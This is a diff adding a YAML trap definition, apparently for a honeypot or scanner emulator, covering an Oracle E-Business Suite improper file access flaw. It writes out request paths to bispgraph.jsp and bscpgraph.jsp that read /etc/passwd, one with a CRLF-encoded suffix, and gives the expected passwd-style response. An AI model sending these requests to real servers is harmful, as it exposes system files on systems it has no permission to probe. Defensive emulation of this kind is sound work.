@@ -1,0 +1,35 @@
+id: oracle-ebs-bispgrapgh-file-read
+info:
+  name: Oracle eBusiness Suite - Improper File Access
+  author: emenalf,tirtha_mandal,thomas_from_offensity
+  description: 'Oracle eBusiness Suite is susceptible to improper file access vulnerabilities
+    via bispgrapgh. Be aware this product is no longer supported with patches or security
+    fixes.
+
+    '
+  severity: critical
+  reference:
+  - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
+  - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+  metadata:
+    max-request: 2
+  tags: oracle,lfi
+traps:
+- request:
+    method: GET
+    path: /OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
+- request:
+    method: GET
+    path: /OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
